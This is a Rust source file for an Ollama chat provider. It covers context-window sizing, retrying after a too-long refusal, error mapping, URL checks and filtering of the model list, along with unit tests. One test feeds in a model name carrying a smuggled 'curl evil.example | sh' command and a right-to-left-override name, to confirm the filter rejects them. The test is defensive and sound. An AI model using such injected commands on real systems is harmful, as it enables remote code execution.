//! Ollama provider (`/api/chat`, `/api/tags`).

use std::time::Duration;

use reqwest::{Client, StatusCode};
use serde_json::{json, Value};
use tokio_util::sync::CancellationToken;
use url::Url;

use super::stream::{self, DeltaSink, Usage, STREAM_IDLE_TIMEOUT, STREAM_TOTAL_TIMEOUT};
use super::{CompletionRequest, Message, ModelInfo, ResponseFormat, Role};
use crate::catalog::embed::ollama::is_embedding_tag;
use crate::error::{truncate_chars, AppError, AppResult, MAX_ERROR_BODY_CHARS, OLLAMA_UNREACHABLE};
use crate::http::body::{read_limited, Overflow, API_BODY_LIMIT};
use crate::http::guard::{check_url, AddressPolicy};
use crate::http::ollama::{endpoint, error_detail, json_error, TagModel, TagsResponse};

/// Bounds/step for the per-request `num_ctx`: too small truncates the prompt to `num_ctx / 2 + 2`
/// tokens and drops the system message, and a fixed value cannot fit a VRAM-dependent default.
const MIN_NUM_CTX: u32 = 4096;
const MAX_NUM_CTX: u32 = 32768;
const NUM_CTX_STEP: u32 = 2048;
/// Kept low so the token estimate runs high: Turkish technical text is ~2.5 chars/token, so
/// dividing by 2 overestimates. Overestimating wastes VRAM, underestimating truncates.
const CHARS_PER_TOKEN: usize = 2;
/// Output budget of a structured request without `max_tokens` (thinking is off there).
const STRUCTURED_OUTPUT_TOKENS: u32 = 1024;
/// Output budget for chat/synthesis (thinking stays on): it covers reasoning plus the answer,
/// with `stream::MAX_REASONING_CHARS` as the runaway guard.
const THINKING_OUTPUT_TOKENS: u32 = 6144;

/// True when the request leaves a reasoning model's thinking channel on.
fn keeps_thinking(request: &CompletionRequest) -> bool {
    matches!(request.format, ResponseFormat::Text) && !request.disable_thinking
}

/// Picks a context window large enough for this request's prompt plus its output budget, rounded up
/// to [`NUM_CTX_STEP`] and clamped to [`MIN_NUM_CTX`]..=[`MAX_NUM_CTX`].
fn desired_num_ctx(request: &CompletionRequest) -> u32 {
    let prompt_chars: usize = request
        .messages
        .iter()
        .map(|m| m.content.chars().count() + 8)
        .sum();
    let default_output = if keeps_thinking(request) {
        THINKING_OUTPUT_TOKENS
    } else {
        STRUCTURED_OUTPUT_TOKENS
    };
    let output = request.max_tokens.unwrap_or(default_output) as usize;
    let needed = prompt_chars / CHARS_PER_TOKEN + output + 256;
    let stepped = needed.div_ceil(NUM_CTX_STEP as usize) * NUM_CTX_STEP as usize;
    stepped.clamp(MIN_NUM_CTX as usize, MAX_NUM_CTX as usize) as u32
}

/// Whether this is the refusal `truncate: false` produces for an oversized prompt. Both chat paths
/// retry it once without the oldest turns, so a long conversation is not lost.
pub fn is_input_too_long(error: &AppError) -> bool {
    matches!(error, AppError::InvalidInput(message) if message == INPUT_TOO_LONG)
}

/// The request with the oldest conversation turns dropped, or `None` when none are left. The
/// system prompt and the last user turn always stay, or the answer would be about something else.
fn without_oldest_turns(request: &CompletionRequest) -> Option<CompletionRequest> {
    let cost = |message: &Message| message.content.chars().count() + 8;
    let head = usize::from(matches!(
        request.messages.first().map(|m| m.role),
        Some(Role::System)
    ));
    let last = request.messages.len().checked_sub(1)?;
    if last <= head {
        return None;
    }
    let fixed: usize = request.messages[..head]
        .iter()
        .chain(request.messages.get(last))
        .map(cost)
        .sum();
    let total: usize = request.messages.iter().map(cost).sum();
    // Half of what was refused, so the retry is meaningfully smaller whatever the real window is.
    let budget = (total / 2).max(fixed);
    let mut kept: Vec<Message> = Vec::new();
    let mut used = fixed;
    for message in request.messages[head..last].iter().rev() {
        if used + cost(message) > budget {
            break;
        }
        used += cost(message);
        kept.push(message.clone());
    }
    if kept.len() == last - head {
        return None;
    }
    kept.reverse();
    let mut messages = request.messages[..head].to_vec();
    messages.append(&mut kept);
    messages.push(request.messages[last].clone());
    Some(CompletionRequest {
        messages,
        format: request.format.clone(),
        ..*request
    })
}

pub struct OllamaProvider {
    client: Client,
    base_url: String,
    model: String,
    /// Longest silence tolerated between two stream chunks; `STREAM_IDLE_TIMEOUT` unless a test
    /// shortens it with [`OllamaProvider::with_stream_idle_timeout`].
    stream_idle_timeout: Duration,
}

/// Validates the base URL against the SSRF policy (loopback always, private if allowed).
pub fn check_base_url(base_url: &str, allow_private_network: bool) -> AppResult<()> {
    let url = Url::parse(base_url)
        .map_err(|e| AppError::config(format!("Ollama base URL is not valid: {e}")))?;
    check_url(&url, AddressPolicy::for_ollama(allow_private_network))
}

/// `"{prefix} HTTP {status}: {detail}"`, without a dangling colon when the body was empty.
fn http_error_message(prefix: &str, status: u16, raw: &[u8]) -> String {
    let detail = error_detail(raw);
    if detail.is_empty() {
        format!("{prefix} HTTP {status}.")
    } else {
        format!("{prefix} HTTP {status}: {detail}")
    }
}

pub use crate::error::INPUT_TOO_LONG;

/// Ollama's refusal when the prompt does not fit `num_ctx`; the wording has changed between
/// releases, so only the part they share is matched.
fn is_context_overflow(error: &str) -> bool {
    error.contains("context")
        && (error.contains("exceed") || error.contains("too long") || error.contains("truncat"))
}

/// Maps a failed `/api/chat` status to an error: missing model and non-chat model get dedicated
/// codes; a plain-text 404 means a wrong address instead.
fn chat_status_error(model: &str, status: StatusCode, raw: &[u8]) -> AppError {
    let json = json_error(raw).map(|e| e.to_lowercase());
    let empty = raw.iter().all(u8::is_ascii_whitespace);
    if status == StatusCode::NOT_FOUND
        && (empty || json.as_deref().is_some_and(|e| e.contains("not found")))
    {
        return AppError::ModelMissing {
            model: model.to_string(),
        };
    }
    if status == StatusCode::BAD_REQUEST
        && json
            .as_deref()
            .is_some_and(|e| e.contains("does not support chat"))
    {
        return AppError::NotChatModel {
            model: model.to_string(),
        };
    }
    if json.as_deref().is_some_and(is_context_overflow) {
        return AppError::invalid_input(INPUT_TOO_LONG);
    }
    AppError::provider(
        http_error_message("Ollama returned", status.as_u16(), raw),
        Some(status.as_u16()),
    )
}

fn send_error(base_url: &str, error: &reqwest::Error) -> AppError {
    let mapped = AppError::from_reqwest("Ollama request failed", error);
    match mapped {
        AppError::Network { status: None, .. } if error.is_connect() => AppError::network_code(
            format!("Could not connect to Ollama at {base_url}. Make sure Ollama is running."),
            OLLAMA_UNREACHABLE,
        ),
        other => other,
    }
}

impl OllamaProvider {
    pub fn new(
        client: Client,
        base_url: &str,
        allow_private_network: bool,
        model: &str,
    ) -> AppResult<Self> {
        check_base_url(base_url, allow_private_network)?;
        Ok(Self {
            client,
            base_url: base_url.trim_end_matches('/').to_string(),
            model: model.to_string(),
            stream_idle_timeout: STREAM_IDLE_TIMEOUT,
        })
    }

    /// Overrides the idle timeout for this instance only (tests run in parallel).
    #[must_use]
    pub fn with_stream_idle_timeout(mut self, timeout: Duration) -> Self {
        self.stream_idle_timeout = timeout;
        self
    }

    fn chat_body(&self, request: &CompletionRequest, stream: bool) -> Value {
        let mut options =
            json!({ "temperature": request.temperature, "num_ctx": desired_num_ctx(request) });
        if let Some(max_tokens) = request.max_tokens {
            options["num_predict"] = json!(max_tokens);
        }
        let mut body = json!({
            "model": self.model,
            "messages": request.messages,
            "stream": stream,
            "options": options,
        });
        match &request.format {
            ResponseFormat::Text => {}
            ResponseFormat::JsonObject => body["format"] = json!("json"),
            ResponseFormat::JsonSchema(schema) => body["format"] = schema.clone(),
        }
        // A reasoning model can fill the window before answering; extraction never needs it.
        if !keeps_thinking(request) {
            body["think"] = json!(false);
        }
        // A low num_ctx estimate must return an error; truncation would drop the system message.
        body["truncate"] = json!(false);
        body
    }

    fn status_error(&self, status: StatusCode, raw: &[u8]) -> AppError {
        chat_status_error(&self.model, status, raw)
    }

    /// Streaming `/api/chat` (NDJSON).
    pub async fn stream(
        &self,
        request: &CompletionRequest,
        token: &CancellationToken,
        sink: &mut DeltaSink<'_>,
    ) -> AppResult<Option<Usage>> {
        let body = self.chat_body(request, true);
        let response = match self.send_stream(&body, token).await? {
            Ok(response) => response,
            Err(error) => {
                if !is_input_too_long(&error) {
                    return Err(error);
                }
                let Some(shorter) = self.with_shorter_history(&body, request) else {
                    return Err(error);
                };
                log::info!(
                    "Ollama refused the prompt as too long; retrying without the oldest turns"
                );
                self.send_stream(&shorter, token).await??
            }
        };
        stream::drive(
            response,
            token,
            "Ollama",
            self.stream_idle_timeout,
            stream::parse_ollama_line,
            sink,
        )
        .await
    }

    /// Opens the stream for `body`. The outer error is fatal (transport, cancellation); the inner
    /// one is the server's answer, which the caller may still retry.
    async fn send_stream(
        &self,
        body: &Value,
        token: &CancellationToken,
    ) -> AppResult<Result<reqwest::Response, AppError>> {
        let send = self
            .client
            .post(endpoint(&self.base_url, "api/chat"))
            .timeout(STREAM_TOTAL_TIMEOUT)
            .json(body)
            .send();
        let response = tokio::select! {
            biased;
            _ = token.cancelled() => return Err(AppError::cancelled()),
            response = send => response.map_err(|e| send_error(&self.base_url, &e))?,
        };
        let status = response.status();
        if status.is_success() {
            return Ok(Ok(response));
        }
        let raw = read_limited(
            response,
            API_BODY_LIMIT,
            Overflow::Truncate,
            "Ollama response",
        )
        .await
        .unwrap_or_default();
        Ok(Err(self.status_error(status, &raw)))
    }

    /// Replaces the conversation in `body` with a shorter one, keeping every other option this
    /// request already negotiated (the format fallback, `think`).
    fn with_shorter_history(&self, body: &Value, request: &CompletionRequest) -> Option<Value> {
        let shorter = without_oldest_turns(request)?;
        let mut body = body.clone();
        body["messages"] = serde_json::to_value(&shorter.messages).ok()?;
        body["options"]["num_ctx"] = json!(desired_num_ctx(&shorter));
        Some(body)
    }

    async fn post_chat(&self, body: &Value) -> AppResult<(StatusCode, Vec<u8>)> {
        let response = self
            .client
            .post(endpoint(&self.base_url, "api/chat"))
            .json(body)
            .send()
            .await
            .map_err(|e| send_error(&self.base_url, &e))?;
        let status = response.status();
        let raw =
            read_limited(response, API_BODY_LIMIT, Overflow::Error, "Ollama response").await?;
        Ok((status, raw))
    }
}

impl OllamaProvider {
    pub fn label(&self) -> &'static str {
        "Ollama"
    }

    pub fn model(&self) -> &str {
        &self.model
    }

    /// Non-streaming completion, reasoning left in; [`super::Provider`] is what cleans it.
    pub async fn complete_raw(&self, request: &CompletionRequest) -> AppResult<String> {
        let mut body = self.chat_body(request, false);
        let (mut status, mut raw) = self.post_chat(&body).await?;

        // Ollama < 0.5 does not understand JSON-schema `format`; retry with plain "json".
        if status == StatusCode::BAD_REQUEST
            && matches!(request.format, ResponseFormat::JsonSchema(_))
        {
            log::info!("Ollama rejected schema format; retrying with format=json");
            body["format"] = json!("json");
            (status, raw) = self.post_chat(&body).await?;
        }

        if !status.is_success() {
            let error = self.status_error(status, &raw);
            if !is_input_too_long(&error) {
                return Err(error);
            }
            let Some(shorter) = self.with_shorter_history(&body, request) else {
                return Err(error);
            };
            log::info!("Ollama refused the prompt as too long; retrying without the oldest turns");
            body = shorter;
            (status, raw) = self.post_chat(&body).await?;
            if !status.is_success() {
                return Err(self.status_error(status, &raw));
            }
        }

        let reply = parse_reply(&raw)?;
        if !reply.content.trim().is_empty() {
            return Ok(reply.content);
        }

        // Empty content with thinking, or `done_reason: length`, means the window filled.
        let already_no_think = body.get("think") == Some(&json!(false));
        if !already_no_think && (reply.thinking_chars > 0 || reply.done_reason == "length") {
            log::info!(
                "Ollama returned no answer after {} thinking characters (done_reason: {}); retrying with think=false",
                reply.thinking_chars,
                reply.done_reason
            );
            body["think"] = json!(false);
            let (retry_status, retry_raw) = self.post_chat(&body).await?;
            if !retry_status.is_success() {
                return Err(self.status_error(retry_status, &retry_raw));
            }
            let retried = parse_reply(&retry_raw)?;
            if !retried.content.trim().is_empty() {
                return Ok(retried.content);
            }
        }

        Err(AppError::provider(
            format!(
                "Ollama returned an empty response (done_reason: {}). The model may have filled its context window before answering; try a smaller page, a shorter conversation, or a model without a thinking mode.",
                reply.done_reason
            ),
            None,
        ))
    }
}

/// The fields of an Ollama `/api/chat` reply this client reads.
struct Reply {
    content: String,
    thinking_chars: usize,
    done_reason: String,
}

fn parse_reply(raw: &[u8]) -> AppResult<Reply> {
    let parsed: Value = serde_json::from_slice(raw)
        .map_err(|e| AppError::Parse(format!("Ollama response was not valid JSON: {e}")))?;
    if let Some(error) = parsed.get("error").and_then(Value::as_str) {
        return Err(AppError::provider(
            format!(
                "Ollama error: {}",
                truncate_chars(error, MAX_ERROR_BODY_CHARS)
            ),
            None,
        ));
    }
    let content = parsed
        .pointer("/message/content")
        .and_then(Value::as_str)
        .map(str::to_string)
        .ok_or_else(|| AppError::Parse("Ollama response did not include text output.".into()))?;
    Ok(Reply {
        content,
        thinking_chars: parsed
            .pointer("/message/thinking")
            .and_then(Value::as_str)
            .map_or(0, |thinking| thinking.chars().count()),
        done_reason: parsed
            .get("done_reason")
            .and_then(Value::as_str)
            .unwrap_or("unknown")
            .to_string(),
    })
}

/// Lists locally available models (`GET /api/tags`).
pub async fn list_models(
    client: &Client,
    base_url: &str,
    allow_private_network: bool,
) -> AppResult<Vec<ModelInfo>> {
    check_base_url(base_url, allow_private_network)?;
    let response = client
        .get(endpoint(base_url, "api/tags"))
        .timeout(std::time::Duration::from_secs(15))
        .send()
        .await
        .map_err(|e| send_error(base_url, &e))?;
    let status = response.status();
    let raw = read_limited(
        response,
        API_BODY_LIMIT,
        Overflow::Error,
        "Ollama model list",
    )
    .await?;
    if !status.is_success() {
        return Err(AppError::provider(
            http_error_message("Ollama model list failed with", status.as_u16(), &raw),
            Some(status.as_u16()),
        ));
    }
    let parsed: TagsResponse = serde_json::from_slice(&raw)
        .map_err(|e| AppError::Parse(format!("Invalid Ollama model list: {e}")))?;
    Ok(models_from_tags(parsed.models))
}

/// The `/api/tags` entries the user can pick. A name that is not plain text is dropped, since the
/// interface pastes names into an `ollama pull …` hint a hostile server must not write.
fn models_from_tags(tags: Vec<TagModel>) -> Vec<ModelInfo> {
    let mut models: Vec<ModelInfo> = tags
        .into_iter()
        .map(|m| TagModel {
            name: m.name.trim().to_string(),
            ..m
        })
        .filter(|m| crate::util::is_plain_model_name(&m.name))
        .map(|m| {
            let embedding = is_embedding_tag(&m);
            let details = m.details;
            ModelInfo {
                id: m.name.clone(),
                name: m.name,
                size_bytes: m.size,
                context_length: details.and_then(|d| d.context_length),
                prompt_price_per_m_tok: None,
                completion_price_per_m_tok: None,
                embedding: embedding.then_some(true),
            }
        })
        .collect();
    models.sort_by(|a, b| a.name.cmp(&b.name));
    models.truncate(crate::util::MAX_LOCAL_MODELS);
    models
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http::HttpClients;
    use crate::providers::{Message, Role};

    fn provider() -> OllamaProvider {
        let clients = HttpClients::new().expect("clients");
        OllamaProvider::new(
            clients.ollama(false).clone(),
            "http://127.0.0.1:11434",
            false,
            "m",
        )
        .expect("provider")
    }

    fn request(format: ResponseFormat) -> CompletionRequest {
        CompletionRequest {
            messages: vec![Message {
                role: Role::User,
                content: "hi".into(),
            }],
            format,
            temperature: 0.2,
            max_tokens: None,
            disable_thinking: false,
        }
    }

    #[test]
    fn structured_requests_disable_the_thinking_channel() {
        let body = provider().chat_body(&request(ResponseFormat::JsonObject), false);
        assert_eq!(body["think"], json!(false));

        let schema = json!({ "type": "object" });
        let body = provider().chat_body(&request(ResponseFormat::JsonSchema(schema)), false);
        assert_eq!(body["think"], json!(false));
    }

    #[test]
    fn plain_chat_leaves_thinking_to_the_model() {
        let body = provider().chat_body(&request(ResponseFormat::Text), false);
        assert!(body.get("think").is_none());
    }

    fn request_with(chars: usize, format: ResponseFormat) -> CompletionRequest {
        CompletionRequest {
            messages: vec![Message {
                role: Role::User,
                content: "a".repeat(chars),
            }],
            format,
            temperature: 0.2,
            max_tokens: Some(1024),
            disable_thinking: false,
        }
    }

    #[test]
    fn chat_reserves_room_for_thinking_but_analysis_keeps_its_window() {
        let chat = provider().chat_body(&request(ResponseFormat::Text), true);
        assert_eq!(chat["options"]["num_ctx"], json!(8192));
        assert!(chat["options"].get("num_predict").is_none());

        let mut synthesis = request(ResponseFormat::Text);
        synthesis.messages[0].content = "a".repeat(3030);
        let num_ctx = desired_num_ctx(&synthesis);
        assert!(
            num_ctx >= 3030 / 2 + THINKING_OUTPUT_TOKENS,
            "synthesis window {num_ctx} leaves no room for reasoning"
        );
        assert_eq!(num_ctx % NUM_CTX_STEP, 0);

        let analysis = provider().chat_body(&request(ResponseFormat::JsonObject), false);
        assert_eq!(analysis["options"]["num_ctx"], json!(4096));
        assert_eq!(
            desired_num_ctx(&request_with(11_367, ResponseFormat::JsonObject)),
            8192,
            "the 11k-character analysis from the real run keeps its 8192 window"
        );
    }

    #[test]
    fn a_text_request_can_turn_thinking_off_with_a_small_budget() {
        let mut probe = request(ResponseFormat::Text);
        probe.disable_thinking = true;
        probe.max_tokens = Some(16);
        let body = provider().chat_body(&probe, false);
        assert_eq!(body["think"], json!(false));
        assert_eq!(body["options"]["num_predict"], json!(16));
        assert_eq!(body["options"]["num_ctx"], json!(MIN_NUM_CTX));
        assert!(body.get("format").is_none());
        assert_eq!(body["truncate"], json!(false));
    }

    #[test]
    fn chat_status_errors_distinguish_missing_and_non_chat_models() {
        let missing = chat_status_error(
            "qwen3:8b",
            StatusCode::NOT_FOUND,
            br#"{"error":"model 'qwen3:8b' not found"}"#,
        );
        assert_eq!(missing.code(), Some("modelMissing"));
        assert_eq!(missing.kind(), "config");
        assert_eq!(missing.model(), Some("qwen3:8b"));
        assert_eq!(
            chat_status_error("m", StatusCode::NOT_FOUND, b"").code(),
            Some("modelMissing")
        );

        let embedding = chat_status_error(
            "bge-m3:latest",
            StatusCode::BAD_REQUEST,
            br#"{"error":"\"bge-m3:latest\" does not support chat"}"#,
        );
        assert_eq!(embedding.code(), Some("notChatModel"));

        let wrong_path = chat_status_error("m", StatusCode::NOT_FOUND, b"404 page not found");
        assert_eq!(wrong_path.kind(), "provider");
        assert_eq!(wrong_path.code(), None);
    }

    #[test]
    fn empty_error_bodies_leave_no_dangling_colon() {
        let error = chat_status_error("m", StatusCode::BAD_GATEWAY, b"");
        assert_eq!(error.to_string(), "Ollama returned HTTP 502.");
        assert_eq!(error.status(), Some(502));
        let error = chat_status_error("m", StatusCode::BAD_GATEWAY, b"  \n");
        assert_eq!(error.to_string(), "Ollama returned HTTP 502.");
        let error = chat_status_error(
            "m",
            StatusCode::INTERNAL_SERVER_ERROR,
            br#"{"error":"boom"}"#,
        );
        assert_eq!(error.to_string(), "Ollama returned HTTP 500: boom");
    }

    #[test]
    fn a_nameless_tags_entry_is_left_out_of_the_model_list() {
        let tags: TagsResponse = serde_json::from_value(json!({
            "models": [
                { "size": 1u64 },
                { "name": "   " },
                { "name": "qwen3:8b", "size": 5u64, "details": { "context_length": 4096u64 } }
            ]
        }))
        .expect("tags");
        let models = models_from_tags(tags.models);
        assert_eq!(models.len(), 1, "a model with no name cannot be selected");
        assert_eq!(models[0].id, "qwen3:8b");
        assert_eq!(models[0].context_length, Some(4096));
    }

    #[test]
    fn a_hostile_model_name_never_reaches_the_model_list() {
        let tags: TagsResponse = serde_json::from_value(json!({
            "models": [
                { "name": "qwen3:8b\"; curl evil.example | sh; \"" },
                { "name": "model name with spaces" },
                { "name": "gpj\u{202e}exe:latest" },
                { "name": "a".repeat(200) },
                { "name": "  qwen3:8b  " },
                { "name": "library/nomic-embed-text:v1.5" }
            ]
        }))
        .expect("tags");
        let ids: Vec<String> = models_from_tags(tags.models)
            .into_iter()
            .map(|m| m.id)
            .collect();
        assert_eq!(
            ids,
            vec!["library/nomic-embed-text:v1.5", "qwen3:8b"],
            "only plain names survive, trimmed"
        );
    }

    #[test]
    fn an_endless_model_list_is_capped() {
        let models: Vec<Value> = (0..crate::util::MAX_LOCAL_MODELS + 50)
            .map(|i| json!({ "name": format!("m{i:05}:latest") }))
            .collect();
        let tags: TagsResponse = serde_json::from_value(json!({ "models": models })).expect("tags");
        assert_eq!(
            models_from_tags(tags.models).len(),
            crate::util::MAX_LOCAL_MODELS
        );
    }

    #[test]
    fn a_refused_prompt_is_retried_without_the_oldest_turns() {
        let turn = |role, text: &str| Message::new(role, text);
        let request = CompletionRequest {
            messages: vec![
                turn(Role::System, "system prompt"),
                turn(Role::User, &"old ".repeat(200)),
                turn(Role::Assistant, &"older answer ".repeat(200)),
                turn(Role::User, &"recent ".repeat(20)),
                turn(Role::Assistant, &"recent answer ".repeat(20)),
                turn(Role::User, "the question"),
            ],
            format: ResponseFormat::Text,
            temperature: 0.2,
            max_tokens: None,
            disable_thinking: false,
        };
        let shorter = without_oldest_turns(&request).expect("there is history to drop");
        assert_eq!(shorter.messages[0].content, "system prompt");
        assert_eq!(
            shorter.messages.last().map(|m| m.content.as_str()),
            Some("the question")
        );
        assert!(
            shorter.messages.len() < request.messages.len(),
            "{} turns",
            shorter.messages.len()
        );
        assert!(
            !shorter
                .messages
                .iter()
                .any(|m| m.content.starts_with("old ")),
            "the oldest turn goes first"
        );
        // The retry has to be smaller, or it would be refused for the same reason.
        let chars = |r: &CompletionRequest| -> usize {
            r.messages.iter().map(|m| m.content.chars().count()).sum()
        };
        assert!(chars(&shorter) < chars(&request));
        assert!(desired_num_ctx(&shorter) <= desired_num_ctx(&request));

        // Nothing left to drop: no retry, the caller gets the original error.
        for messages in [
            vec![turn(Role::System, "system"), turn(Role::User, "question")],
            vec![turn(Role::User, "question")],
            Vec::new(),
        ] {
            let bare = CompletionRequest {
                messages,
                ..request.clone()
            };
            assert!(without_oldest_turns(&bare).is_none(), "{bare:?}");
        }

        assert!(is_input_too_long(&AppError::invalid_input(INPUT_TOO_LONG)));
        assert!(!is_input_too_long(&AppError::invalid_input(
            "something else"
        )));
        assert!(!is_input_too_long(&AppError::provider("boom", None)));
    }

    #[test]
    fn num_ctx_grows_with_the_prompt_and_stays_within_bounds() {
        let tiny = provider().chat_body(&request(ResponseFormat::JsonObject), false);
        assert_eq!(tiny["options"]["num_ctx"], json!(MIN_NUM_CTX));

        let big = desired_num_ctx(&request_with(26_000, ResponseFormat::JsonObject));
        assert!(
            big > 8192,
            "a 4000-word page must ask for more than 8192, got {big}"
        );
        assert!(big <= MAX_NUM_CTX);
        assert_eq!(big % NUM_CTX_STEP, 0, "num_ctx is rounded to the step");

        assert_eq!(
            desired_num_ctx(&request_with(5_000_000, ResponseFormat::Text)),
            MAX_NUM_CTX
        );
    }

    /// Silent truncation drops the start of the prompt, so an answer would omit the system message.
    #[test]
    fn every_request_refuses_silent_truncation() {
        for format in [
            ResponseFormat::JsonObject,
            ResponseFormat::Text,
            ResponseFormat::JsonSchema(json!({ "type": "object" })),
        ] {
            let body = provider().chat_body(&request(format.clone()), false);
            assert_eq!(body["truncate"], json!(false), "{format:?}");
        }

        let refused = chat_status_error(
            "qwen3:8b",
            StatusCode::BAD_REQUEST,
            br#"{"error":"input length exceeds maximum context length"}"#,
        );
        assert_eq!(refused.kind(), "invalidInput");
        assert_eq!(refused.to_string(), INPUT_TOO_LONG);
        assert!(refused.to_string().contains("context"), "{refused}");

        let unrelated =
            chat_status_error("qwen3:8b", StatusCode::BAD_REQUEST, br#"{"error":"bad"}"#);
        assert_eq!(unrelated.kind(), "provider");
    }

    #[test]
    fn reply_parser_reports_thinking_and_stop_reason() {
        let raw = r#"{"message":{"content":"","thinking":"uzun düşünce"},"done_reason":"length"}"#;
        let reply = parse_reply(raw.as_bytes()).expect("reply");
        assert!(reply.content.is_empty());
        assert_eq!(reply.thinking_chars, 12);
        assert_ne!(reply.thinking_chars, "uzun düşünce".len());
        assert_eq!(reply.done_reason, "length");
    }
}
